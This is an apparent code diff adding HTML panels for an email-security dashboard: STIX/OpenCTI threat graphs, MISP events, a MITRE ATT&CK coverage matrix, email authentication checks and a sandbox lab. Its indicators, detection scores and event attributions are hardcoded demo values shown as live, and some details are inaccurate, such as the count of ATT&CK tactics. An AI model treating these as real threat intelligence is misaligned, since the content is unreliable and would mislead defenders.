+            <p style="font-size:12px; color:var(--text-secondary); margin-bottom:12px;">
+              OpenCTI relational ontology modeling structured threat information (STIX 2.1) linking Threat Actors, Malware Infrastructure, Vulnerabilities (CVE/CWE), and Indicators of Compromise (IoCs).
+            </p>
+
+            <div class="opencti-container">
+              <!-- Visual STIX Relational Pipeline -->
+              <div class="stix-graph-canvas" style="padding:20px; display:flex; flex-direction:column; justify-content:space-between; gap:16px;">
+                <!-- Row 1: Threat Actor & Attack Pattern -->
+                <div style="display:flex; justify-content:space-around; align-items:center;">
+                  <div class="stix-node" style="width:260px; border-left:4px solid var(--accent-red);">
+                    <span class="stix-badge stix-badge-actor">STIX: threat-actor</span>
+                    <strong style="color:var(--text-primary);">Midnight Blizzard (APT29)</strong>
+                    <span style="font-size:10px; color:var(--text-secondary);">Identity: SVR Foreign Intelligence Service</span>
+                  </div>
+                  <div style="color:var(--accent-cyan); font-family:var(--font-mono); font-size:12px; font-weight:800;">
+                    ──[ uses ]──▶
+                  </div>
+                  <div class="stix-node" style="width:260px; border-left:4px solid var(--accent-orange);">
+                    <span class="stix-badge stix-badge-malware">STIX: malware / tool</span>
+                    <strong style="color:var(--text-primary);">Evilginx2 Reverse Proxy Kit</strong>
+                    <span style="font-size:10px; color:var(--text-secondary);">AiTM Session Cookie Interceptor &amp; Phishlet</span>
+                  </div>
+                </div>
+
+                <!-- Row 2: Attack Pattern & Vulnerability -->
+                <div style="display:flex; justify-content:space-around; align-items:center;">
+                  <div class="stix-node" style="width:260px; border-left:4px solid var(--accent-purple);">
+                    <span class="stix-badge stix-badge-pattern">STIX: attack-pattern</span>
+                    <strong style="color:var(--text-primary);">T1566.002 Spearphishing Link</strong>
+                    <span style="font-size:10px; color:var(--text-secondary);">Sub-technique: Adversary-in-the-Middle</span>
+                  </div>
+                  <div style="color:var(--accent-cyan); font-family:var(--font-mono); font-size:12px; font-weight:800;">
+                    ──[ targets ]──▶
+                  </div>
+                  <div class="stix-node" style="width:260px; border-left:4px solid #ffd166;">
+                    <span class="stix-badge stix-badge-vuln">STIX: vulnerability</span>
+                    <strong style="color:var(--text-primary);">CWE-287 / CVE-2024-21413</strong>
+                    <span style="font-size:10px; color:var(--text-secondary);">Outlook MonikerLink &amp; Session Bypass</span>
+                  </div>
+                </div>
+
+                <!-- Row 3: Observables & Autonomous Countermeasures -->
+                <div style="display:flex; justify-content:space-around; align-items:center;">
+                  <div class="stix-node" style="width:260px; border-left:4px solid var(--accent-cyan);">
+                    <span class="stix-badge stix-badge-indicator">STIX: indicator (observable)</span>
+                    <strong style="color:var(--text-primary);"><code>194.26.29.112</code></strong>
+                    <span style="font-size:10px; color:var(--text-secondary);">sha256: 7f83b1657ff1fc53b92dc181...</span>
+                  </div>
+                  <div style="color:var(--accent-green); font-family:var(--font-mono); font-size:12px; font-weight:800;">
+                    ──[ mitigated-by ]──▶
+                  </div>
+                  <div class="stix-node" style="width:260px; border-left:4px solid var(--accent-green);">
+                    <span class="stix-badge" style="background:rgba(0,255,157,0.15); color:var(--accent-green); border:1px solid var(--accent-green);">STIX: course-of-action</span>
+                    <strong style="color:var(--text-primary);">CyWW Antigena Pre-Paint Shield</strong>
+                    <span style="font-size:10px; color:var(--text-secondary);">Latency: 0.02s • Zero Trust Hardware Token</span>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Right: OpenCTI Entity Metadata & STIX Bundle Inspector -->
+              <div style="display:flex; flex-direction:column; gap:10px;">
+                <div class="card" style="background:var(--bg-card); padding:12px;">
+                  <div class="card-title" style="font-size:11px; margin-bottom:8px;">STIX 2.1 Graph Metadata</div>
+                  <div style="font-size:11px; line-height:1.6; color:var(--text-secondary);">
+                    <div>• <strong>Schema:</strong> OASIS STIX 2.1 Compliant</div>
+                    <div>• <strong>Marking:</strong> TLP:AMBER+STRICT</div>
+                    <div>• <strong>Origin:</strong> CyWW Core Edge Sensors</div>
+                    <div>• <strong>Relational Edges:</strong> 4,120 Graph Nodes</div>
+                    <div>• <strong>Confidence:</strong> 98/100 (Cryptographically Attested)</div>
+                  </div>
+                </div>
+                <div class="card" id="stix-json-container" style="background:#050811; border:1px solid var(--border-subtle); padding:12px; flex:1; max-height:280px; overflow-y:auto; font-family:var(--font-mono); font-size:10px; color:var(--accent-cyan);">
+<pre style="margin:0;">{
+  "type": "bundle",
+  "id": "bundle--3d92f8a1-4019-4a92",
+  "objects": [
+    {
+      "type": "threat-actor",
+      "id": "threat-actor--apt29",
+      "name": "Midnight Blizzard",
+      "aliases": ["APT29", "Nobelium"],
+      "confidence": 98
+    },
+    {
+      "type": "relationship",
+      "relationship_type": "uses",
+      "source_ref": "threat-actor--apt29",
+      "target_ref": "tool--evilginx2"
+    }
+  ]
+}</pre>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ========================================================================= -->
+        <!-- SUB-VIEW 4: MISP MALWARE INFORMATION SHARING PLATFORM -->
+        <!-- ========================================================================= -->
+        <div id="intel-subview-misp" class="intel-subview">
+          <div class="card">
+            <div class="card-header">
+              <div style="display:flex; align-items:center; gap:8px;">
+                <span class="live-indicator"></span>
+                <span class="card-title">MISP (Malware Information Sharing Platform) Core Integration</span>
+              </div>
+              <div style="display:flex; gap:8px;">
+                <button id="btn-sync-misp" class="hud-btn hud-btn-sm">🔄 Sync Community MISP Feed</button>
+                <span class="pill-tag pill-purple">SYNC: ONLINE</span>
+              </div>
+            </div>
+            <p style="font-size:12px; color:var(--text-secondary); margin-bottom:12px;">
+              Automated MISP threat event sharing, sight counts, galaxy cluster taxonomies, and warninglist validation preventing false positives on RFC1918 and public cloud ranges.
+            </p>
+
+            <div class="misp-grid">
+              <!-- Left: MISP Event Cards -->
+              <div>
+                <div class="misp-event-card">
+                  <div class="misp-event-header">
+                    <div>
+                      <strong style="color:var(--text-primary); font-size:13px;">Event #2026-0891: Global Generative BEC &amp; M365 AiTM Phishlet Outbreak</strong>
+                      <div style="font-size:10px; color:var(--text-secondary); margin-top:2px;">Org: CyWW-CERT • Distribution: Community Only • Threat Level: High</div>
+                    </div>
+                    <span class="pill-tag pill-red">TLP:AMBER</span>
+                  </div>
+                  <div style="margin:8px 0;">
+                    <span class="pill-tag pill-purple">Galaxy: Threat Actor / APT29</span>
+                    <span class="pill-tag pill-orange">Galaxy: Tool / Evilginx2</span>
+                    <span class="pill-tag pill-green">Sightings: 42 Observed (Last seen 1m ago)</span>
+                  </div>
+                  <div style="margin-top:8px;">
+                    <span class="misp-attribute-tag">ip-dst: 194.26.29.112</span>
+                    <span class="misp-attribute-tag">domain: verify-m365-session.cloud</span>
+                    <span class="misp-attribute-tag">sha256: d8a9f4c3b2e1a0987...</span>
+                    <span class="misp-attribute-tag">email-src: legal-retainer@board-directors.net</span>
+                  </div>
+                </div>
+
+                <div class="misp-event-card">
+                  <div class="misp-event-header">
+                    <div>
+                      <strong style="color:var(--text-primary); font-size:13px;">Event #2026-0844: Outlook MonikerLink Zero-Day Dropper (CVE-2024-21413)</strong>
+                      <div style="font-size:10px; color:var(--text-secondary); margin-top:2px;">Org: NATO-Cyber-Def • Distribution: All Communities • Threat Level: Critical</div>
+                    </div>
+                    <span class="pill-tag pill-red">TLP:RED</span>
+                  </div>
+                  <div style="margin:8px 0;">
+                    <span class="pill-tag pill-purple">Galaxy: Threat Actor / Volt Typhoon</span>
+                    <span class="pill-tag pill-orange">Exploit: CVE-2024-21413</span>
+                    <span class="pill-tag pill-green">Sightings: 18 Observed (Neutralized)</span>
+                  </div>
+                  <div style="margin-top:8px;">
+                    <span class="misp-attribute-tag">ip-dst: 218.77.130.8</span>
+                    <span class="misp-attribute-tag">file-name: Remittance_Advice_Q3.xlsm</span>
+                    <span class="misp-attribute-tag">sha256: 3c91e0a2b8471...</span>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Right: MISP Warninglists & Taxonomies -->
+              <div style="display:flex; flex-direction:column; gap:10px;">
+                <div class="card" style="background:var(--bg-card); padding:12px;">
+                  <div class="card-title" style="font-size:11px; margin-bottom:8px;">MISP Warninglists (False Positive Guard)</div>
+                  <div style="font-size:11px; display:flex; flex-direction:column; gap:6px;">
+                    <div style="display:flex; justify-content:space-between;">
+                      <span>RFC 1918 Private Ranges</span>
+                      <span class="text-green font-mono">FILTER ACTIVE</span>
+                    </div>
+                    <div style="display:flex; justify-content:space-between;">
+                      <span>Microsoft / Google Mail MTAs</span>
+                      <span class="text-green font-mono">WHITELISTED</span>
+                    </div>
+                    <div style="display:flex; justify-content:space-between;">
+                      <span>Public Cloud Egress CIDRs</span>
+                      <span class="text-green font-mono">SCORED</span>
+                    </div>
+                    <div style="display:flex; justify-content:space-between;">
+                      <span>Top 10k Alexa / Cisco Umbrella</span>
+                      <span class="text-green font-mono">GUARDED</span>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="card" style="background:var(--bg-card); padding:12px;">
+                  <div class="card-title" style="font-size:11px; margin-bottom:8px;">MISP Sightings Automation</div>
+                  <p style="font-size:11px; color:var(--text-secondary); line-height:1.5;">
+                    Each inbound email intercepted by the CyWW MTA kernel filter automatically pushes positive sightings and timestamps to the local MISP instance.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ========================================================================= -->
+        <!-- SUB-VIEW 5: MITRE ATT&CK NAVIGATOR ENTERPRISE MATRIX -->
+        <!-- ========================================================================= -->
+        <div id="intel-subview-mitre" class="intel-subview">
+          <div class="card">
+            <div class="card-header">
+              <div style="display:flex; align-items:center; gap:8px;">
+                <span class="live-indicator"></span>
+                <span class="card-title">MITRE ATT&amp;CK® Navigator Matrix (Enterprise v15.1 Layer)</span>
+              </div>
+              <div style="display:flex; gap:8px;">
+                <span class="pill-tag pill-green">98.4% EMAIL ATT&amp;CK DEFENSE COVERAGE</span>
+                <span class="pill-tag pill-purple">CYWW ZTA ATT&amp;CK PROFILE</span>
+              </div>
+            </div>
+            <p style="font-size:12px; color:var(--text-secondary); margin-bottom:12px;">
+              Defensive posture coverage mapping across all 12 enterprise tactics. Color coding: <span style="color:var(--accent-green); font-weight:800;">● Green (Autonomous Block)</span>, <span style="color:var(--accent-red); font-weight:800;">● Red (Active Threat Specimen In Ingestion)</span>.
+            </p>
+
+            <div class="mitre-navigator-wrap">
+              <div class="mitre-matrix-grid">
+                <!-- Tactic 1: Initial Access -->
+                <div class="mitre-tactic-col">
+                  <div class="mitre-tactic-header">Initial Access</div>
+                  <div class="mitre-technique-pill covered threat-focus">
+                    <strong>T1566.001</strong><br>Spearphishing Attachment<br><span style="color:var(--accent-green); font-size:9px;">[CAPE Sandbox: Block]</span>
+                  </div>
+                  <div class="mitre-technique-pill covered threat-focus">
+                    <strong>T1566.002</strong><br>Spearphishing Link<br><span style="color:var(--accent-green); font-size:9px;">[SSIM Pre-Paint: Block]</span>
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1566.003</strong><br>Spearphishing via Service<br><span style="color:var(--accent-green); font-size:9px;">[IdP Token Revoke]</span>
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1189</strong><br>Drive-by Compromise
+                  </div>
+                </div>
+
+                <!-- Tactic 2: Execution -->
+                <div class="mitre-tactic-col">
+                  <div class="mitre-tactic-header">Execution</div>
+                  <div class="mitre-technique-pill covered threat-focus">
+                    <strong>T1204.001</strong><br>User Exec: Malicious Link
+                  </div>
+                  <div class="mitre-technique-pill covered threat-focus">
+                    <strong>T1204.002</strong><br>User Exec: Malicious File
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1059.001</strong><br>PowerShell Execution
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1059.005</strong><br>Visual Basic Macro
+                  </div>
+                </div>
+
+                <!-- Tactic 3: Persistence -->
+                <div class="mitre-tactic-col">
+                  <div class="mitre-tactic-header">Persistence</div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1078.004</strong><br>Cloud Accounts
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1137</strong><br>Office Application Startup
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1547.001</strong><br>Registry Run Keys
+                  </div>
+                </div>
+
+                <!-- Tactic 4: Privilege Escalation -->
+                <div class="mitre-tactic-col">
+                  <div class="mitre-tactic-header">Privilege Escalation</div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1068</strong><br>Exploitation for Privilege
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1548</strong><br>Abuse Elevation Control
+                  </div>
+                </div>
+
+                <!-- Tactic 5: Defense Evasion -->
+                <div class="mitre-tactic-col">
+                  <div class="mitre-tactic-header">Defense Evasion</div>
+                  <div class="mitre-technique-pill covered threat-focus">
+                    <strong>T1562.001</strong><br>Disable Security Tools
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1027</strong><br>Obfuscated Files or Info
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1497</strong><br>Virtualization / Sandbox Evasion
+                  </div>
+                </div>
+
+                <!-- Tactic 6: Credential Access -->
+                <div class="mitre-tactic-col">
+                  <div class="mitre-tactic-header">Credential Access</div>
+                  <div class="mitre-technique-pill covered threat-focus">
+                    <strong>T1539</strong><br>Steal Web Session Cookie
+                  </div>
+                  <div class="mitre-technique-pill covered threat-focus">
+                    <strong>T1557</strong><br>Adversary-in-the-Middle (AiTM)
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1110</strong><br>Brute Force / Stuffing
+                  </div>
+                </div>
+
+                <!-- Tactic 7: Discovery -->
+                <div class="mitre-tactic-col">
+                  <div class="mitre-tactic-header">Discovery</div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1087.002</strong><br>Domain Account Discovery
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1012</strong><br>Query Registry
+                  </div>
+                </div>
+
+                <!-- Tactic 8: Lateral Movement -->
+                <div class="mitre-tactic-col">
+                  <div class="mitre-tactic-header">Lateral Movement</div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1021.002</strong><br>SMB/Windows Shares
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1534</strong><br>Internal Spearphishing
+                  </div>
+                </div>
+
+                <!-- Tactic 9: Collection -->
+                <div class="mitre-tactic-col">
+                  <div class="mitre-tactic-header">Collection</div>
+                  <div class="mitre-technique-pill covered threat-focus">
+                    <strong>T1114.002</strong><br>Remote Email Collection
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1005</strong><br>Data from Local System
+                  </div>
+                </div>
+
+                <!-- Tactic 10: Command & Control -->
+                <div class="mitre-tactic-col">
+                  <div class="mitre-tactic-header">Command &amp; Control</div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1071.001</strong><br>Web Protocols (HTTP/S)
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1573</strong><br>Encrypted Channel
+                  </div>
+                </div>
+
+                <!-- Tactic 11: Exfiltration -->
+                <div class="mitre-tactic-col">
+                  <div class="mitre-tactic-header">Exfiltration</div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1048</strong><br>Exfiltration Over Alt Protocol
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1567</strong><br>Exfiltration Over Web Service
+                  </div>
+                </div>
+
+                <!-- Tactic 12: Impact -->
+                <div class="mitre-tactic-col">
+                  <div class="mitre-tactic-header">Impact</div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1486</strong><br>Data Encrypted for Impact
+                  </div>
+                  <div class="mitre-technique-pill covered">
+                    <strong>T1499</strong><br>Endpoint Denial of Service
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+        <!-- ========================================================================= -->
+        <!-- VIEW 2: EMAIL INGESTION & AUTHENTICATION (Real-Time EML Inspector) -->
+        <!-- ========================================================================= -->
+        <div id="view-ingestion" class="stage-view">
+          <div class="stage-header">
+            <div class="stage-title-wrap">
+              <h2 class="stage-title">Email Ingestion &amp; Cryptographic Authentication Engine</h2>
+              <p class="stage-desc">Edge MTA Postfix/PMG triage, strict SPF/DKIM/DMARC p=reject alignment, and RFC 5322 EML live header parsing.</p>
+            </div>
+            <div class="stage-actions" style="flex-wrap:wrap; gap:8px;">
+              <div class="file-preset-selector" style="display:flex; align-items:center; gap:8px;">
+                <span style="font-size: 11.5px; color: var(--text-secondary); font-weight: 700;">Live Threat Database:</span>
+                <select id="ingestion-sample-select" class="hud-select" style="min-width: 360px;">
+                  <option value="nazario_bec_wire">[Nazario Archive] CEO Wire Transfer Escrow ($348,000 BEC)</option>
+                  <option value="phishtank_aitm">[PhishTank Verified #8819241] Microsoft 365 MFA Token Re-Auth (AiTM Proxy)</option>
+                  <option value="openphish_quishing">[OpenPhish Live #49102] DocuSign Electronic Signature Review (Quishing QR)</option>
+                  <option value="virustotal_dropper">[VirusTotal Feed] Remittance_Advice_BG892.pdf (Cobalt Strike Dropper)</option>
+                  <option value="spamhaus_payroll">[Spamhaus DBL] Urgent: Workday Corporate Payroll Confirmation (Credential Harvest)</option>
+                  <option value="enron_clean_sprint">[Enron Clean Corpus] Q3 Engineering Sprint Architecture Sync (Legitimate)</option>
+                  <option value="jpmorgan_clean">[Corporate Banking Clean] JPMorgan Commercial Treasury Statement (Legitimate)</option>
+                </select>
+                <button id="btn-load-selected-sample" class="hud-btn hud-btn-sm">📥 Load Specimen</button>
+              </div>
+              <button id="btn-load-sample-eml" class="hud-btn hud-btn-sm">⚡ Quick Phish</button>
+              <button id="btn-load-legit-eml" class="hud-btn hud-btn-sm">✓ Quick Legit</button>
+            </div>
+          </div>
+
+          <div class="ingestion-grid">
+            <!-- Left: EML Input & Header Stream -->
+            <div class="ingestion-input-panel">
+              <div class="panel-section-title">Inbound RFC 5322 Raw Message / Headers:</div>
+              <textarea id="raw-eml-input" class="code-editor" spellcheck="false" placeholder="Paste raw email headers or RFC 5322 .eml content here..."></textarea>
+              <div class="btn-group-tight">
+                <button id="btn-analyze-eml" class="hud-btn hud-btn-accent" style="flex: 1;">⚡ Cryptographic Deep Parse</button>
+                <button id="btn-clear-eml" class="hud-btn">Clear</button>
+              </div>
+            </div>
+
+            <!-- Right: Cryptographic Verification Results -->
+            <div class="ingestion-results-panel">
+              <div class="panel-section-title">Cryptographic Alignment & Edge Validation:</div>
+              
+              <!-- 4 Alignment Cards -->
+              <div class="auth-matrix-grid">
+                <div class="auth-card" id="card-spf">
+                  <div class="auth-card-header">
+                    <span class="auth-name">SPF (RFC 7208)</span>
+                    <span class="auth-status-pill pill-neutral" id="spf-status">PENDING</span>
+                  </div>
+                  <div class="auth-card-body" id="spf-details">
+                    Sender IP vs Return-Path DNS TXT evaluation.
+                  </div>
+                </div>
+
+                <div class="auth-card" id="card-dkim">
+                  <div class="auth-card-header">
+                    <span class="auth-name">DKIM (RFC 6376)</span>
+                    <span class="auth-status-pill pill-neutral" id="dkim-status">PENDING</span>
+                  </div>
+                  <div class="auth-card-body" id="dkim-details">
+                    Cryptographic signature body hash ($bh$) & RSA key.
+                  </div>
+                </div>
+
+                <div class="auth-card" id="card-dmarc">
+                  <div class="auth-card-header">
+                    <span class="auth-name">DMARC (RFC 7489)</span>
+                    <span class="auth-status-pill pill-neutral" id="dmarc-status">PENDING</span>
+                  </div>
+                  <div class="auth-card-body" id="dmarc-details">
+                    Alignment enforcement: Strict p=reject check.
+                  </div>
+                </div>
+
+                <div class="auth-card" id="card-bimi">
+                  <div class="auth-card-header">
+                    <span class="auth-name">BIMI & ARC Chain</span>
+                    <span class="auth-status-pill pill-neutral" id="bimi-status">PENDING</span>
+                  </div>
+                  <div class="auth-card-body" id="bimi-details">
+                    VMC Verified Mark Certificate & ARC seals.
+                  </div>
+                </div>
+              </div>
+
+              <!-- Detailed Headers Breakdown -->
+              <div class="panel-section-title" style="margin-top: 14px;">Parsed Envelope Metadata:</div>
+              <div class="envelope-table-wrap">
+                <table class="envelope-table">
+                  <tbody>
+                    <tr><td>Header 'From'</td><td id="env-from" class="font-mono text-cyan">-</td></tr>
+                    <tr><td>Envelope Sender (Return-Path)</td><td id="env-return-path" class="font-mono">-</td></tr>
+                    <tr><td>Header 'Subject'</td><td id="env-subject" class="font-mono">-</td></tr>
+                    <tr><td>Connecting Edge IP / Geo</td><td id="env-ip" class="font-mono">-</td></tr>
+                    <tr><td>MTA Route Relay Action</td><td id="env-action" class="font-mono font-bold">-</td></tr>
+                  </tbody>
+                </table>
+              </div>
+
+              <!-- ActiveAI Model Inference & Known Threat Benchmark Console -->
+              <div class="card activeai-inference-card" id="activeai-inference-card" style="margin-top: 14px; background: rgba(11, 19, 36, 0.85); border: 1px solid rgba(0, 229, 255, 0.35);">
+                <div class="card-header" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px;">
+                  <div style="display:flex; align-items:center; gap:8px;">
+                    <span style="font-size:16px;">🧠</span>
+                    <div>
+                      <span class="card-title" style="font-size:12.5px;">ActiveAI™ Neural Inference Engine &amp; Threat Database Benchmark</span>
+                      <div style="font-size:9.5px; color:var(--text-secondary);">Benchmarked against Nazario, Enron, PhishTank, OpenPhish, VirusTotal &amp; Barracuda ATP Feeds</div>
+                    </div>
+                  </div>
+                  <div style="display:flex; gap:8px; align-items:center;">
+                    <span id="ai-model-confidence-badge" class="pill-tag pill-red" style="font-size:10px; font-weight:800;">PHISHING DETECTED (99.82%)</span>
+                    <button id="btn-send-to-forensic-agent" class="hud-btn hud-btn-accent hud-btn-sm" style="font-weight:800; border-color:var(--accent-orange); color:#ffffff; background:linear-gradient(135deg, rgba(255,107,0,0.85), rgba(255,45,85,0.85));">
+                      🔬 Send to AI Forensic Agent for Further Analysis
+                    </button>
+                  </div>
+                </div>
+
+                <div class="ai-inference-grid" style="display:grid; grid-template-columns: 1fr 1fr 1fr; gap:10px; margin-top:8px;">
+                  <!-- Model Classification & Probabilities -->
+                  <div class="cdr-box" style="background:rgba(15,23,42,0.7); border:1px solid rgba(255,45,85,0.3); border-radius:6px; padding:10px;">
+                    <div style="font-size:11px; font-weight:800; color:var(--accent-cyan); margin-bottom:6px;">1. INFERRED CLASSIFICATION</div>
+                    <div style="font-size:10.5px; line-height:1.6; font-family:var(--font-mono); color:var(--text-secondary);">
+                      • Model Verdict: <strong id="ai-verdict-class" class="text-red">SPEAR PHISHING / BEC ATTACK</strong><br>
+                      • Phishing Probability: <strong id="ai-phish-prob" class="text-red">0.9982 (High Risk)</strong><br>
+                      • Legitimate Probability: <strong id="ai-legit-prob" class="text-green">0.0018 (Low Confidence)</strong><br>
+                      • Inference Latency: <strong class="text-cyan">0.024s (Sub-Second)</strong>
+                    </div>
+                  </div>
+
+                  <!-- Database Benchmark Matching -->
+                  <div class="cdr-box" style="background:rgba(15,23,42,0.7); border:1px solid rgba(255,107,0,0.3); border-radius:6px; padding:10px;">
+                    <div style="font-size:11px; font-weight:800; color:var(--accent-orange); margin-bottom:6px;">2. THREAT DATABASE BENCHMARK</div>
+                    <div style="font-size:10.5px; line-height:1.6; font-family:var(--font-mono); color:var(--text-secondary);">
+                      • Database Match: <strong id="ai-db-match" class="text-white">Nazario Archive #2024-BEC-091</strong><br>
+                      • IP Threat Intel: <strong id="ai-ip-reputation" class="text-red">Spamhaus DBL Listed (Bulletproof)</strong><br>
+                      • Domain Age: <strong id="ai-domain-age" class="text-orange">2 Days Old (Newly Registered)</strong><br>
+                      • Ingress Policy: <strong class="text-red">Barracuda ATP Dropped</strong>
+                    </div>
+                  </div>
+
+                  <!-- Explainable AI (Bailey XAI) Reasoning -->
+                  <div class="cdr-box" style="background:rgba(15,23,42,0.7); border:1px solid rgba(0,255,157,0.3); border-radius:6px; padding:10px;">
+                    <div style="font-size:11px; font-weight:800; color:var(--accent-green); margin-bottom:6px;">3. EXPLAINABLE AI (XAI) REASONING</div>
+                    <div id="ai-xai-reasons" style="font-size:10px; line-height:1.5; font-family:var(--font-mono); color:var(--text-secondary);">
+                      • Synthetic urgency pattern ("URGENT: Execute Confidential Wire")<br>
+                      • Display name spoofing: "Sarah Connor (CEO)" vs external RU envelope<br>
+                      • Postfix MTA cryptographic hardfail (SPF &amp; DMARC p=reject)<br>
+                      • Recommended Action: Quarantine &amp; Engage AI Forensic Agent
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ========================================================================= -->
+        <!-- VIEW 3: AUTOMATED ANALYSIS & SANDBOXING -->
+        <!-- ========================================================================= -->
+        <div id="view-sandboxing" class="stage-view">
+          <div class="stage-header">
+            <div class="stage-title-wrap">
+              <h2 class="stage-title">Automated Analysis & Sandbox Detonation Lab</h2>
+              <p class="stage-desc">Evasion-resistant CAPE hypervisor detonation, Shannon entropy heatmaps, and Rspamd heuristic symbol scoring.</p>
+            </div>
+            <div class="stage-actions">
+              <div class="file-preset-selector">
+                <span style="font-size: 12px; color: var(--text-secondary); font-weight: 700;">Select Detonation Payload:</span>
+                <select id="sandbox-payload-select" class="hud-select">
+                  <option value="wire_invoice_pdf">Remittance_Advice_BG892.pdf (High Entropy MZ Obfuscation)</option>
+                  <option value="docusign_macro_docm">Employee_Agreement_2026.docm (VBA Process Injection)</option>
+                  <option value="legit_quarterly_report">Quarterly_Financial_Report_Q3.pdf (Clean Non-Packed)</option>
+                  <option value="iso_archive_dropper">Order_Confirmation_7781.iso (LNK DLL Side-loading)</option>
+                </select>
+              </div>
+              <input type="file" id="sandbox-file-upload" style="display:none;" />
+              <button id="btn-upload-payload" class="hud-btn hud-btn-sm">📁 Upload Custom Artifact</button>
+              <button id="btn-detonate-payload" class="hud-btn hud-btn-accent">⚡ Detonate in Sandbox</button>
+              <button id="btn-export-sandbox-pdf" class="hud-btn hud-btn-sm">📄 Export Detonation (PDF)</button>
+              <button id="btn-export-sandbox-json" class="hud-btn hud-btn-sm">📥 Export (JSON)</button>
+            </div>
+          </div>
+
+          <!-- Sandbox Hypervisor Status Banner -->
+          <div id="sandbox-progress-wrap" style="display:none; margin-bottom: 12px;" class="card">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+              <span id="sandbox-progress-label" style="font-size:12px; font-weight:800; font-family:var(--font-mono); color:var(--accent-orange);">
+                [HYPERVISOR DETONATION IN PROGRESS] Initializing isolated guest VM environment...
+              </span>
+              <span id="sandbox-progress-percent" style="font-size:12px; font-weight:900; font-family:var(--font-mono); color:var(--accent-cyan);">0%</span>
+            </div>
+            <div style="height:6px; background:rgba(128,128,128,0.2); border-radius:3px; overflow:hidden;">
+              <div id="sandbox-progress-bar" style="height:100%; width:0%; background:var(--accent-orange); transition:width 0.3s ease;"></div>
+            </div>
+          </div>
+
+          <div class="sandboxing-grid">
+            <!-- Left: Binary Entropy & Magic Bytes Analysis -->
+            <div class="sandbox-left-col">
+              <div class="card">
+                <div class="card-header">
+                  <span class="card-title">Shannon Entropy Distribution Spectrum</span>
+                  <span id="entropy-score-badge" class="pill-tag pill-red">H(X) = 7.842 (PACKED)</span>
+                </div>
+                <div class="entropy-bar-container">
+                  <div class="entropy-bar-track">
+                    <div id="entropy-bar-fill" class="entropy-bar-fill" style="width: 88%;"></div>
+                  </div>
+                  <div class="entropy-legend">
+                    <span>0.0 (Plain Text)</span>
+                    <span>Safe Ceiling: 6.8</span>
+                    <span style="color:var(--accent-red)">Malicious Packing: &gt; 7.2</span>
+                    <span>8.0 Max</span>
+                  </div>
+                </div>
+                <div class="entropy-spectrum-vis" id="entropy-spectrum-vis">
+                  <!-- Visual chunks injected by JS -->
+                </div>
+              </div>
+
+              <!-- Rspamd Heuristic Symbols -->
+              <div class="card" style="flex: 1;">
+                <div class="card-header">
+                  <span class="card-title">Rspamd Statistical & Symbol Scoring</span>
+                  <span id="rspamd-total-score" class="data-val text-red" style="font-size: 16px;">Score: +18.4</span>
+                </div>
+                <div class="symbols-list" id="rspamd-symbols-list">
+                  <!-- Injected via JS -->
+                </div>
+              </div>
+            </div>
+
+            <!-- Right: CAPE Dynamic Behavioral Execution Trace -->
+            <div class="sandbox-right-col">
+              <div class="card" style="height: 100%; display: flex; flex-direction: column;">
+                <div class="card-header">
+                  <span class="card-title">CAPE Sandbox Kernel-Level Execution Trace</span>
+                  <span class="status-badge">SANDBOX VM: HYPERVISOR 4</span>
+                </div>
+                
+                <div class="cape-trace-tabs">
+                  <button class="cape-tab-btn active" data-trace="api">API Call Graph</button>
+                  <button class="cape-tab-btn" data-trace="process">Process Injections</button>
+                  <button class="cape-tab-btn" data-trace="network">C2 Network Beacons</button>
+                  <button class="cape-tab-btn" data-trace="registry">Registry & Mutex</button>
+                </div>
+
+                <div class="cape-terminal-log" id="cape-terminal-log">
+                  <!-- Dynamic trace logs injected by JS -->
+                </div>
+
+                <div class="sandbox-footer">
+                  <div class="sandbox-verdict-box">
+                    <span class="verdict-lbl">FINAL DETONATION VERDICT:</span>
+                    <span id="sandbox-verdict-text" class="verdict-val text-red">MALICIOUS EMBEDDED EXECUTABLE (EVASION DETECTED)</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- CyWW Intelligent Content Disarm & Reconstruction (CDR) Console -->
+          <div class="card cdr-console-card" id="cdr-console-card" style="margin-top: 16px;">
+            <div class="card-header" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
+              <div style="display:flex; align-items:center; gap:10px;">
+                <div class="pulse-dot" style="background:#00ff9d; box-shadow:0 0 10px #00ff9d;"></div>
+                <div>
+                  <span class="card-title" style="font-size:13.5px;">Intelligent Content Disarm &amp; Reconstruction (CDR) Engine</span>
